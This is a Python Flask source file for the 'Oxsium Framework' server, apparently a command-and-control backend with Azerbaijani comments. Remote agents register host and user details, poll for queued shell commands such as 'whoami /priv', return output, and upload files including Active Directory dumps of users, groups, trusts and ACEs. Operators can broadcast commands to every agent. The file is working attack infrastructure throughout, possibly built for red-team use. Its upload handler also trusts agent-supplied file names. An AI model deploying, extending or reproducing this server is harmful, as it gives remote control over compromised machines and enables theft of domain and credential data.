from __future__ import annotations

import hashlib
import hmac as _hmac
import json
import logging
import os
import secrets
import sys
import threading
import time
import uuid
from collections import deque
from datetime import datetime, timezone
from functools import wraps
from pathlib import Path
from typing import Any

# ── sys.path ─────────────────────────────────────────────────────────────────
_HERE = Path(__file__).parent
_MAIN = _HERE.parent
for _p in (_HERE, _MAIN):
    if str(_p) not in sys.path:
        sys.path.insert(0, str(_p))

from flask import Flask, Response, g, jsonify, request, stream_with_context
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

from connect.config import Config

# ─────────────────────────────────────────────────────────────────────────────
# Logging
# ─────────────────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("oxsium.server")

# ─────────────────────────────────────────────────────────────────────────────
# Server Config  (UI parametrləri + env override-ları)
# ─────────────────────────────────────────────────────────────────────────────

class ServerConfig:
    """
    UI-dən gələn bütün Server tab parametrləri.
    Dəyərlər /api/server/start endpoint-i vasitəsilə runtime-da dəyişdirilə bilər.
    """
    # Listener
    host:             str  = os.getenv("SRV_HOST",     "0.0.0.0")
    port:             int  = int(os.getenv("SRV_PORT",  "4444"))

    # Auth
    auth_method:      str  = os.getenv("SRV_AUTH",     "token")   # token|mtls|psk|cert
    psk:              str  = os.getenv("SRV_PSK",       "")        # Pre-Shared Key
    jwt_secret:       str  = os.getenv("SRV_JWT_SECRET", secrets.token_hex(32))

    # Capacity
    max_connections:  int  = int(os.getenv("SRV_MAX_CONN",  "50"))

    # Agent identity
    agent_id_gen:     str  = os.getenv("SRV_ID_GEN",   "uuid4")   # uuid4|uuid5|custom|sequential
    agent_id_prefix:  str  = os.getenv("SRV_ID_PREFIX", "OXS")

    # Security
    security_proto:   str  = os.getenv("SRV_SEC_PROTO", "hmac")   # hmac|tls13|psk
    serialization:    str  = os.getenv("SRV_SERIAL",    "json")    # json|msgpack|protobuf|cbor

    # Transport
    transport:        str  = os.getenv("SRV_TRANSPORT", "ws")      # ws|rest

    # Heartbeat
    heartbeat_interval: int = int(os.getenv("SRV_HB_INTERVAL", "30"))
    heartbeat_timeout:  int = int(os.getenv("SRV_HB_TIMEOUT",  "90"))

    # Internals
    _seq_counter: int = 0

    @classmethod
    def update(cls, data: dict) -> None:
        """UI-dən gələn JSON ilə konfiqurasiyanı yenilə."""
        mapping = {
            "host":             ("host",             str),
            "port":             ("port",             int),
            "auth_method":      ("auth_method",      str),
            "psk":              ("psk",              str),
            "max_connections":  ("max_connections",  int),
            "agent_id_gen":     ("agent_id_gen",     str),
            "agent_id_prefix":  ("agent_id_prefix",  str),
            "security_proto":   ("security_proto",   str),
            "serialization":    ("serialization",    str),
            "transport":        ("transport",        str),
            "heartbeat_interval": ("heartbeat_interval", int),
            "heartbeat_timeout":  ("heartbeat_timeout",  int),
        }
        for key, (attr, cast) in mapping.items():
            if key in data:
                try:
                    setattr(cls, attr, cast(data[key]))
                except (ValueError, TypeError):
                    pass

    @classmethod
    def generate_agent_id(cls) -> str:
        if cls.agent_id_gen == "uuid5":
            return str(uuid.uuid5(uuid.NAMESPACE_DNS, f"{cls.agent_id_prefix}-{time.time()}"))
        if cls.agent_id_gen == "custom":
            h = hashlib.sha256(f"{cls.agent_id_prefix}-{time.time()}-{secrets.token_hex(4)}".encode()).hexdigest()[:12]
            return f"{cls.agent_id_prefix}-{h.upper()}"
        if cls.agent_id_gen == "sequential":
            cls._seq_counter += 1
            return f"{cls.agent_id_prefix}-{cls._seq_counter:06d}"
        # default: uuid4
        return str(uuid.uuid4())

    @classmethod
    def to_dict(cls) -> dict:
        return {
            "host":               cls.host,
            "port":               cls.port,
            "auth_method":        cls.auth_method,
            "max_connections":    cls.max_connections,
            "agent_id_gen":       cls.agent_id_gen,
            "agent_id_prefix":    cls.agent_id_prefix,
            "security_proto":     cls.security_proto,
            "serialization":      cls.serialization,
            "transport":          cls.transport,
            "heartbeat_interval": cls.heartbeat_interval,
            "heartbeat_timeout":  cls.heartbeat_timeout,
        }


# ─────────────────────────────────────────────────────────────────────────────
# In-Memory State
# ─────────────────────────────────────────────────────────────────────────────

_lock = threading.Lock()

# agent_id → agent record
_agents: dict[str, dict] = {}

# agent_id → deque of pending commands
_command_queue: dict[str, deque] = {}

# agent_id → list of received result records
_results: dict[str, list] = {}

# Global server log ring-buffer (max 500 entries)
_server_log: deque = deque(maxlen=500)

# Server running state
_server_running = False
_heartbeat_thread: threading.Thread | None = None


def _ts() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def _log(level: str, msg: str) -> None:
    entry = {"ts": _ts(), "level": level, "msg": msg}
    _server_log.append(entry)
    fn = getattr(logger, level.lower(), logger.info)
    fn(msg)


# ─────────────────────────────────────────────────────────────────────────────
# Auth helpers
# ─────────────────────────────────────────────────────────────────────────────

def _verify_token(token: str) -> bool:
    """Token auth: sadə Bearer token yoxlaması."""
    if not token:
        return False
    try:
        payload_b64, sig = token.rsplit(".", 1)
        expected = _hmac.new(
            ServerConfig.jwt_secret.encode(),
            payload_b64.encode(),
            hashlib.sha256,
        ).hexdigest()
        return _hmac.compare_digest(expected, sig)
    except Exception:
        return False


def _issue_token(agent_id: str) -> str:
    """Agent üçün imzalı token yarat."""
    payload = f"{agent_id}.{int(time.time())}"
    sig = _hmac.new(
        ServerConfig.jwt_secret.encode(),
        payload.encode(),
        hashlib.sha256,
    ).hexdigest()
    return f"{payload}.{sig}"


def _verify_psk(provided: str) -> bool:
    if not ServerConfig.psk:
        return True   # PSK konfiqurasiya edilməyibsə burax
    return _hmac.compare_digest(provided or "", ServerConfig.psk)


def _verify_hmac_sig(body: bytes, signature: str) -> bool:
    expected = _hmac.new(
        ServerConfig.jwt_secret.encode(),
        body,
        hashlib.sha256,
    ).hexdigest()
    return _hmac.compare_digest(expected, signature or "")


def _auth_agent(agent_id: str) -> tuple[bool, str]:
    """
    Server tab-dakı auth_method-a uyğun agent-i doğrula.
    Returns (ok, error_msg).
    """
    method = ServerConfig.auth_method

    if method == "token":
        auth_hdr = request.headers.get("Authorization", "")
        token = auth_hdr.removeprefix("Bearer ").strip()
        # Birinci qeydiyyat zamanı token hələ yoxdur
        if agent_id and agent_id in _agents:
            if not _verify_token(token):
                return False, "Invalid bearer token"
        return True, ""

    if method in ("psk", "mtls"):
        psk = request.headers.get("X-PSK", "") or (request.json or {}).get("psk", "")
        if not _verify_psk(psk):
            return False, "PSK mismatch"
        return True, ""

    if method == "cert":
        # TLS client cert yoxlaması reverse-proxy tərəfindən edilir;
        # burada CN header-ini qəbul edirik
        cn = request.headers.get("X-Client-CN", "")
        if not cn:
            return False, "Client certificate CN missing"
        return True, ""

    # Naməlum metod — burax
    return True, ""


def _require_agent_auth(f):
    """Decorator: agent endpoint-lərini qoruyur."""
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not _server_running:
            return jsonify({"error": "Server is not running"}), 503
        agent_id = kwargs.get("agent_id") or (request.json or {}).get("agent_id", "")
        ok, err = _auth_agent(agent_id)
        if not ok:
            _log("warning", f"Auth failed for agent {agent_id}: {err}")
            return jsonify({"error": err}), 401
        return f(*args, **kwargs)
    return wrapper


def _require_local(f):
    """Decorator: yalnız localhost-dan olan admin endpoint-lərini qoruyur."""
    @wraps(f)
    def wrapper(*args, **kwargs):
        if request.remote_addr not in ("127.0.0.1", "::1", "localhost"):
            return jsonify({"error": "Admin endpoints are localhost-only"}), 403
        return f(*args, **kwargs)
    return wrapper


# ─────────────────────────────────────────────────────────────────────────────
# Heartbeat thread
# ─────────────────────────────────────────────────────────────────────────────

def _heartbeat_worker() -> None:
    """Agentlərin timeout-unu yoxlayan arxa-plan thread-i."""
    while _server_running:
        now = time.time()
        with _lock:
            for aid, agent in list(_agents.items()):
                last = agent.get("last_seen", 0)
                if now - last > ServerConfig.heartbeat_timeout:
                    if agent.get("status") == "online":
                        agent["status"] = "timeout"
                        _log("warning", f"Agent {aid} timed out (last seen {int(now-last)}s ago)")
        time.sleep(ServerConfig.heartbeat_interval // 2 or 15)


# ─────────────────────────────────────────────────────────────────────────────
# Flask App
# ─────────────────────────────────────────────────────────────────────────────

app = Flask(__name__)
CORS(
    app,
    resources={r"/api/*": {"origins": ["*", "null"]}},
    allow_headers=["Content-Type", "Authorization", "X-PSK", "X-HMAC-Sig", "X-Client-CN"],
    methods=["GET", "POST", "DELETE", "OPTIONS"],
    supports_credentials=False,
)

limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=["10000 per day", "2000 per hour"],
    storage_uri=os.getenv("REDIS_URL", "memory://"),
)


# ─────────────────────────────────────────────────────────────────────────────
# ══ ADMIN ENDPOINTS  (localhost only) ══
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/api/server/start", methods=["POST"])
@_require_local
def server_start():
    """
    UI-dən Server tabının parametrləri ilə serveri başlat.

    Body (hamısı optional — mövcud konfiqurasiyanı override edir):
    {
      "host":             "0.0.0.0",
      "port":             4444,
      "auth_method":      "token",       // token|mtls|psk|cert
      "psk":              "s3cr3t",
      "max_connections":  50,
      "agent_id_gen":     "uuid4",       // uuid4|uuid5|custom|sequential
      "agent_id_prefix":  "OXS",
      "security_proto":   "hmac",        // hmac|tls13|psk
      "serialization":    "json",        // json|msgpack|protobuf|cbor
      "transport":        "ws",          // ws|rest
      "heartbeat_interval": 30,
      "heartbeat_timeout":  90
    }
    """
    global _server_running, _heartbeat_thread

    data = request.get_json(silent=True) or {}
    ServerConfig.update(data)

    if _server_running:
        return jsonify({"ok": True, "status": "already_running", "config": ServerConfig.to_dict()})

    _server_running = True

    _heartbeat_thread = threading.Thread(target=_heartbeat_worker, daemon=True)
    _heartbeat_thread.start()

    _log("info",    "═══════════════════════════════════════")
    _log("info",    f"  Listener  : {ServerConfig.host}:{ServerConfig.port}")
    _log("info",    f"  Auth      : {ServerConfig.auth_method}")
    _log("info",    f"  Transport : {ServerConfig.transport.upper()}")
    _log("info",    f"  Security  : {ServerConfig.security_proto}")
    _log("info",    f"  ID gen    : {ServerConfig.agent_id_gen}")
    _log("info",    f"  Max conn  : {ServerConfig.max_connections}")
    _log("info",    "═══════════════════════════════════════")
    _log("info",    "Server ready — awaiting agent connections.")

    return jsonify({"ok": True, "status": "started", "config": ServerConfig.to_dict()})


@app.route("/api/server/stop", methods=["POST"])
@_require_local
def server_stop():
    """Serveri dayandır."""
    global _server_running
    if not _server_running:
        return jsonify({"ok": True, "status": "already_stopped"})

    _server_running = False

    with _lock:
        for agent in _agents.values():
            agent["status"] = "disconnected"

    _log("warning", "Shutdown signal received.")
    _log("warning", "All agent connections marked disconnected.")
    _log("info",    "Server stopped.")

    return jsonify({"ok": True, "status": "stopped"})


@app.route("/api/server/status", methods=["GET"])
@_require_local
def server_status():
    """Server statusu, aktiv agent sayı, konfiqurasiya."""
    with _lock:
        online  = [a for a in _agents.values() if a.get("status") == "online"]
        timeout = [a for a in _agents.values() if a.get("status") == "timeout"]
    return jsonify({
        "running":       _server_running,
        "config":        ServerConfig.to_dict(),
        "agents_total":  len(_agents),
        "agents_online": len(online),
        "agents_timeout": len(timeout),
        "uptime_agents": [
            {"id": a["id"], "hostname": a.get("hostname","?"), "status": a.get("status")}
            for a in online
        ],
    })


@app.route("/api/server/config", methods=["POST"])
@_require_local
def server_config_update():
    """Server işləyərkən konfiqurasiyanı dəyişdir (port xaricində)."""
    data = request.get_json(silent=True) or {}
    data.pop("port", None)   # port dəyişdirmək üçün restart lazımdır
    ServerConfig.update(data)
    _log("info", f"Config updated: {list(data.keys())}")
    return jsonify({"ok": True, "config": ServerConfig.to_dict()})


# ─────────────────────────────────────────────────────────────────────────────
# ══ LOG STREAM ══
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/api/server/logs", methods=["GET"])
@_require_local
def server_logs():
    """Son N log girişini qaytar (default 100)."""
    n = min(int(request.args.get("n", 100)), 500)
    with _lock:
        entries = list(_server_log)[-n:]
    return jsonify({"logs": entries, "total": len(_server_log)})


@app.route("/api/server/logs/stream", methods=["GET"])
@_require_local
def server_logs_stream():
    """
    Server-Sent Events (SSE) axını — UI terminal-i canlı yeniləmək üçün.
    EventSource('http://localhost:4444/api/server/logs/stream')
    """
    last_idx = [len(_server_log)]

    def _generate():
        while _server_running:
            with _lock:
                current = list(_server_log)
            new = current[last_idx[0]:]
            for entry in new:
                last_idx[0] += 1
                yield f"data: {json.dumps(entry)}\n\n"
            time.sleep(0.5)
        yield "data: {\"level\":\"info\",\"msg\":\"Server stopped.\",\"ts\":\"" + _ts() + "\"}\n\n"

    return Response(
        stream_with_context(_generate()),
        mimetype="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
        },
    )


# ─────────────────────────────────────────────────────────────────────────────
# ══ AGENT ENDPOINTS  (agentlər bu endpoint-ləri çağırır) ══
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/api/agent/register", methods=["POST"])
@limiter.limit("200 per minute")
def agent_register():
    """
    Agent ilk dəfə qoşulduqda qeydiyyatdan keçir.

    Body:
    {
      "hostname":   "WORKSTATION-01",
      "os":         "Windows 10 Pro 22H2",
      "username":   "jdoe",
      "ip":         "192.168.1.55",
      "arch":       "x64",
      "pid":        1234,
      "psk":        "s3cr3t",          // auth_method=psk üçün
      "metadata":   { ... }            // əlavə məlumat
    }

    Response:
    {
      "agent_id": "OXS-a3f9...",
      "token":    "...",               // auth_method=token üçün
      "interval": 30
    }
    """
    if not _server_running:
        return jsonify({"error": "Server is not running"}), 503

    data = request.get_json(silent=True) or {}

    # Capacity yoxla
    with _lock:
        if len([a for a in _agents.values() if a.get("status") == "online"]) >= ServerConfig.max_connections:
            _log("warning", "Max connections reached — registration rejected")
            return jsonify({"error": "Server at capacity"}), 503

    # PSK / cert yoxla (token-dən başqa metodlar üçün)
    if ServerConfig.auth_method == "psk":
        if not _verify_psk(data.get("psk", "")):
            _log("warning", f"Agent registration rejected: PSK mismatch from {request.remote_addr}")
            return jsonify({"error": "PSK mismatch"}), 401

    # Agent ID yarat
    agent_id = ServerConfig.generate_agent_id()
    token    = _issue_token(agent_id)
    now      = time.time()

    record = {
        "id":          agent_id,
        "registered":  _ts(),
        "last_seen":   now,
        "status":      "online",
        "hostname":    data.get("hostname", "unknown"),
        "os":          data.get("os",       "unknown"),
        "username":    data.get("username", "unknown"),
        "ip":          data.get("ip",       request.remote_addr),
        "arch":        data.get("arch",     "unknown"),
        "pid":         data.get("pid",      0),
        "metadata":    data.get("metadata", {}),
        "token":       token,
        "remote_addr": request.remote_addr,
    }

    with _lock:
        _agents[agent_id]        = record
        _command_queue[agent_id] = deque()
        _results[agent_id]       = []

    _log("info", f"Agent registered: {agent_id} | {record['hostname']} | {record['ip']} | {record['os']}")

    return jsonify({
        "agent_id": agent_id,
        "token":    token,
        "interval": ServerConfig.heartbeat_interval,
        "config": {
            "serialization": ServerConfig.serialization,
            "transport":     ServerConfig.transport,
        },
    })


@app.route("/api/agent/<agent_id>/checkin", methods=["POST"])
@_require_agent_auth
@limiter.limit("600 per minute")
def agent_checkin(agent_id: str):
    """
    Agent hər heartbeat_interval saniyədə bir çağırır.
    Gözləyən əmrləri (varsa) geri qaytarır.

    Body (hamısı optional):
    {
      "status":   "idle",            // idle|busy|error
      "metadata": { ... }
    }

    Response:
    {
      "commands": [ { "id": "...", "type": "shell", "payload": "whoami" }, ... ]
    }
    """
    data = request.get_json(silent=True) or {}

    with _lock:
        if agent_id not in _agents:
            return jsonify({"error": "Unknown agent"}), 404

        agent = _agents[agent_id]
        agent["last_seen"] = time.time()
        agent["status"]    = "online"

        if "metadata" in data:
            agent["metadata"].update(data["metadata"])
        if "status" in data:
            agent["task_status"] = data["status"]

        # Gözləyən əmrləri götür
        queue = _command_queue.get(agent_id, deque())
        commands = []
        while queue:
            commands.append(queue.popleft())

    if commands:
        _log("info", f"Dispatching {len(commands)} command(s) to {agent_id}")

    return jsonify({"commands": commands, "ts": _ts()})


@app.route("/api/agent/<agent_id>/result", methods=["POST"])
@_require_agent_auth
@limiter.limit("600 per minute")
def agent_result(agent_id: str):
    """
    Agent əmrin nəticəsini göndərir.

    Body:
    {
      "command_id": "cmd-uuid",
      "type":       "shell",
      "output":     "NT AUTHORITY\\SYSTEM\r\n",
      "exit_code":  0,
      "error":      null
    }
    """
    data = request.get_json(silent=True) or {}

    with _lock:
        if agent_id not in _agents:
            return jsonify({"error": "Unknown agent"}), 404

        result_record = {
            "command_id": data.get("command_id", ""),
            "type":       data.get("type",       "unknown"),
            "output":     data.get("output",     ""),
            "exit_code":  data.get("exit_code",  -1),
            "error":      data.get("error"),
            "received":   _ts(),
            "agent_id":   agent_id,
        }
        _results[agent_id].append(result_record)
        _agents[agent_id]["last_seen"] = time.time()

    _log("info", f"Result from {agent_id} [{data.get('type','?')}] exit={data.get('exit_code','?')}")

    # Nəticəni diskə yaz (Domain Object qovluğuna)
    _persist_result(agent_id, result_record)

    return jsonify({"ok": True})


@app.route("/api/agent/<agent_id>/upload", methods=["POST"])
@_require_agent_auth
@limiter.limit("120 per minute")
def agent_upload(agent_id: str):
    """
    Agent fayl yükləyir.
    Content-Type: multipart/form-data  →  field: 'file'
    və ya Content-Type: application/octet-stream  →  raw body

    Query params:
      ?filename=output.json
      ?filetype=domain_users    // məlum növ: domain_users|domain_computers|...
    """
    with _lock:
        if agent_id not in _agents:
            return jsonify({"error": "Unknown agent"}), 404
        _agents[agent_id]["last_seen"] = time.time()

    filename = request.args.get("filename", f"upload_{agent_id}_{int(time.time())}.bin")
    filetype = request.args.get("filetype", "")

    # Fayl məzmununu oxu
    if request.content_type and "multipart" in request.content_type:
        f = request.files.get("file")
        if not f:
            return jsonify({"error": "No file field in multipart"}), 400
        raw = f.read()
        filename = f.filename or filename
    else:
        raw = request.get_data()

    # Yadda saxla
    save_dir = Config.DOMAIN_OBJECT_DIR / "agent_uploads" / agent_id
    save_dir.mkdir(parents=True, exist_ok=True)
    save_path = save_dir / filename

    save_path.write_bytes(raw)

    # Tanınan domain object növlərini əsas qovluğa da kopyala
    _known = {
        "domain_users":     "domain_users.json",
        "domain_computers": "domain_computers.json",
        "domain_groups":    "domain_groups.json",
        "domain_ous":       "domain_ous.json",
        "domain_gpos":      "domain_gpos.json",
        "domain_trusts":    "domain_trusts.json",
        "domain_aces":      "domain_aces.json",
    }
    if filetype in _known:
        dest = Config.DOMAIN_OBJECT_DIR / _known[filetype]
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(raw)
        _log("info", f"Agent {agent_id} uploaded {filetype} → {dest} ({len(raw)} bytes)")
    else:
        _log("info", f"Agent {agent_id} uploaded {filename} ({len(raw)} bytes)")

    return jsonify({"ok": True, "saved_as": str(save_path), "size": len(raw)})


@app.route("/api/agent/<agent_id>/disconnect", methods=["POST"])
@_require_agent_auth
def agent_disconnect(agent_id: str):
    """Agent öz iradəsi ilə ayrılır."""
    with _lock:
        if agent_id in _agents:
            _agents[agent_id]["status"] = "disconnected"
            _log("info", f"Agent {agent_id} disconnected gracefully")
    return jsonify({"ok": True})


# ─────────────────────────────────────────────────────────────────────────────
# ══ COMMAND ENDPOINTS  (operator UI-dən çağırır) ══
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/api/agents", methods=["GET"])
@_require_local
def list_agents():
    """Bütün qeydiyyatdan keçmiş agentlərin siyahısı."""
    with _lock:
        agents = [
            {k: v for k, v in a.items() if k != "token"}
            for a in _agents.values()
        ]
    return jsonify({"agents": agents, "count": len(agents)})


@app.route("/api/agents/<agent_id>", methods=["GET"])
@_require_local
def get_agent(agent_id: str):
    """Tək agent haqqında məlumat."""
    with _lock:
        agent = _agents.get(agent_id)
    if not agent:
        return jsonify({"error": "Agent not found"}), 404
    return jsonify({k: v for k, v in agent.items() if k != "token"})


@app.route("/api/agents/<agent_id>", methods=["DELETE"])
@_require_local
def delete_agent(agent_id: str):
    """Agenti silicitliyindən çıxar."""
    with _lock:
        _agents.pop(agent_id, None)
        _command_queue.pop(agent_id, None)
        _results.pop(agent_id, None)
    _log("info", f"Agent {agent_id} removed from registry")
    return jsonify({"ok": True})


@app.route("/api/agents/<agent_id>/command", methods=["POST"])
@_require_local
def send_command(agent_id: str):
    """
    Agentə əmr göndər.

    Body:
    {
      "type":    "shell",               // shell|upload|download|sleep|terminate|custom
      "payload": "whoami /priv",        // əmrin məzmunu
      "timeout": 30                     // saniyə (optional)
    }

    Əmr növləri:
      shell      — shell/PowerShell əmri icra et
      upload     — serverə fayl yüklə  (payload = remote_path)
      download   — serverdən fayl al   (payload = local_path)
      sleep      — yatma intervalını dəyiş (payload = saniyə)
      terminate  — agenti söndür
      custom     — istənilən JSON payload
    """
    with _lock:
        if agent_id not in _agents:
            return jsonify({"error": "Agent not found"}), 404
        if _agents[agent_id].get("status") not in ("online",):
            return jsonify({"error": "Agent is not online"}), 409

    data = request.get_json(silent=True) or {}
    cmd_type = data.get("type", "shell")
    payload  = data.get("payload", "")

    if not payload and cmd_type not in ("terminate",):
        return jsonify({"error": "payload is required"}), 400

    command = {
        "id":      str(uuid.uuid4()),
        "type":    cmd_type,
        "payload": payload,
        "timeout": int(data.get("timeout", 30)),
        "issued":  _ts(),
    }

    with _lock:
        _command_queue[agent_id].append(command)

    _log("info", f"Command queued → {agent_id} [{cmd_type}]: {str(payload)[:80]}")
    return jsonify({"ok": True, "command_id": command["id"]})


@app.route("/api/agents/<agent_id>/command/bulk", methods=["POST"])
@_require_local
def send_bulk_commands(agent_id: str):
    """
    Bir agentə birdəfəyə çoxlu əmr göndər.

    Body:
    {
      "commands": [
        { "type": "shell", "payload": "hostname" },
        { "type": "shell", "payload": "whoami"   }
      ]
    }
    """
    with _lock:
        if agent_id not in _agents:
            return jsonify({"error": "Agent not found"}), 404

    data = request.get_json(silent=True) or {}
    commands_raw = data.get("commands", [])
    if not isinstance(commands_raw, list) or not commands_raw:
        return jsonify({"error": "commands must be a non-empty list"}), 400

    ids = []
    with _lock:
        for item in commands_raw:
            cmd = {
                "id":      str(uuid.uuid4()),
                "type":    item.get("type",    "shell"),
                "payload": item.get("payload", ""),
                "timeout": int(item.get("timeout", 30)),
                "issued":  _ts(),
            }
            _command_queue[agent_id].append(cmd)
            ids.append(cmd["id"])

    _log("info", f"Bulk: {len(ids)} command(s) queued → {agent_id}")
    return jsonify({"ok": True, "command_ids": ids})


@app.route("/api/broadcast", methods=["POST"])
@_require_local
def broadcast_command():
    """
    Bütün online agentlərə eyni əmri göndər.

    Body: { "type": "shell", "payload": "hostname" }
    """
    data = request.get_json(silent=True) or {}
    cmd_type = data.get("type", "shell")
    payload  = data.get("payload", "")

    sent = []
    with _lock:
        for aid, agent in _agents.items():
            if agent.get("status") == "online":
                cmd = {
                    "id":      str(uuid.uuid4()),
                    "type":    cmd_type,
                    "payload": payload,
                    "timeout": int(data.get("timeout", 30)),
                    "issued":  _ts(),
                }
                _command_queue[aid].append(cmd)
                sent.append(aid)

    _log("info", f"Broadcast [{cmd_type}] → {len(sent)} agent(s): {str(payload)[:60]}")
    return jsonify({"ok": True, "sent_to": sent, "count": len(sent)})


@app.route("/api/agents/<agent_id>/results", methods=["GET"])
@_require_local
def get_results(agent_id: str):
    """Agentdən gəlmiş bütün nəticələr."""
    with _lock:
        if agent_id not in _agents:
            return jsonify({"error": "Agent not found"}), 404
        results = list(_results.get(agent_id, []))
    return jsonify({"results": results, "count": len(results)})


@app.route("/api/agents/<agent_id>/results/<command_id>", methods=["GET"])
@_require_local
def get_result_by_cmd(agent_id: str, command_id: str):
    """Konkret əmrin nəticəsi."""
    with _lock:
        results = _results.get(agent_id, [])
        match = [r for r in results if r.get("command_id") == command_id]
    if not match:
        return jsonify({"error": "Result not found"}), 404
    return jsonify(match[-1])


@app.route("/api/agents/<agent_id>/queue", methods=["GET"])
@_require_local
def get_queue(agent_id: str):
    """Agentə göndərilməyi gözləyən əmrlər."""
    with _lock:
        if agent_id not in _agents:
            return jsonify({"error": "Agent not found"}), 404
        q = list(_command_queue.get(agent_id, deque()))
    return jsonify({"pending": q, "count": len(q)})


@app.route("/api/agents/<agent_id>/queue", methods=["DELETE"])
@_require_local
def clear_queue(agent_id: str):
    """Agentin gözləyən əmrlərini təmizlə."""
    with _lock:
        if agent_id in _command_queue:
            _command_queue[agent_id].clear()
    _log("info", f"Command queue cleared for {agent_id}")
    return jsonify({"ok": True})


# ─────────────────────────────────────────────────────────────────────────────
# Persist helpers
# ─────────────────────────────────────────────────────────────────────────────

def _persist_result(agent_id: str, record: dict) -> None:
    """Nəticəni disk-ə yaz."""
    try:
        out_dir = Config.DOMAIN_OBJECT_DIR / "agent_results" / agent_id
        out_dir.mkdir(parents=True, exist_ok=True)
        fname = f"result_{record['command_id'] or int(time.time())}.json"
        (out_dir / fname).write_text(json.dumps(record, ensure_ascii=False, indent=2), encoding="utf-8")
    except Exception as exc:
        logger.warning("Could not persist result: %s", exc)


# ─────────────────────────────────────────────────────────────────────────────
# Health
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "running": _server_running, "ts": _ts()})


# ─────────────────────────────────────────────────────────────────────────────
# Error handlers
# ─────────────────────────────────────────────────────────────────────────────

@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(405)
def method_not_allowed(e):
    return jsonify({"error": "Method not allowed"}), 405

@app.errorhandler(500)
def internal(e):
    logger.exception("Internal error")
    return jsonify({"error": "Internal server error"}), 500


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

def _print_banner() -> None:
    print("""
╔══════════════════════════════════════════════════════════╗
║            Oxsium Framework — Server API                 ║
╠══════════════════════════════════════════════════════════╣
║  Admin  (localhost only):                                ║
║    POST /api/server/start      — serveri başlat          ║
║    POST /api/server/stop       — serveri dayandır        ║
║    GET  /api/server/status     — status + konfig         ║
║    GET  /api/server/logs       — son loglar              ║
║    GET  /api/server/logs/stream — SSE log axını          ║
║                                                          ║
║  Agent endpoints:                                        ║
║    POST /api/agent/register    — qeydiyyat               ║
║    POST /api/agent/<id>/checkin — heartbeat + əmrlər     ║
║    POST /api/agent/<id>/result  — nəticə göndər          ║
║    POST /api/agent/<id>/upload  — fayl yüklə             ║
║                                                          ║
║  Operator (localhost):                                   ║
║    GET  /api/agents                — agent siyahısı      ║
║    POST /api/agents/<id>/command   — əmr göndər          ║
║    POST /api/agents/<id>/command/bulk                    ║
║    POST /api/broadcast             — hamıya yayımla      ║
║    GET  /api/agents/<id>/results   — nəticələr           ║
╚══════════════════════════════════════════════════════════╝
""")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Oxsium Server")
    parser.add_argument("--host",      default=ServerConfig.host,  help="Bind host")
    parser.add_argument("--port",      default=ServerConfig.port,  type=int, help="Bind port")
    parser.add_argument("--auth",      default=ServerConfig.auth_method, help="Auth method")
    parser.add_argument("--psk",       default=ServerConfig.psk,   help="Pre-shared key")
    parser.add_argument("--max-conn",  default=ServerConfig.max_connections, type=int)
    parser.add_argument("--id-gen",    default=ServerConfig.agent_id_gen)
    parser.add_argument("--transport", default=ServerConfig.transport)
    parser.add_argument("--debug",     action="store_true")
    args = parser.parse_args()

    ServerConfig.update({
        "host":            args.host,
        "port":            args.port,
        "auth_method":     args.auth,
        "psk":             args.psk,
        "max_connections": args.max_conn,
        "agent_id_gen":    args.id_gen,
        "transport":       args.transport,
    })

    _print_banner()
    logger.info("Flask API listening on %s:%s", ServerConfig.host, ServerConfig.port)

    app.run(
        host=ServerConfig.host,
        port=ServerConfig.port,
        debug=args.debug,
        threaded=True,
        use_reloader=False,
    )